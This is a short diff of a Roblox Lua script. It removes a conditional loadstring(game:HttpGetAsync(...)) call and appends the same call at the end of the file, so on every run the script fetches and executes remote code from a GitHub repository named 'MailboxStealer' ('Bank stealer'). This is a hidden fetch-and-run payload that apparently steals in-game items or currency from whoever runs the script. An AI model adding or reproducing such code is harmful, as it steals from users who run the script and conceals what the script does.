@@ -920,7 +920,6 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -2065,3 +2064,5 @@ spawn(function()
         wait(1)
     end
 end)
+
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))()
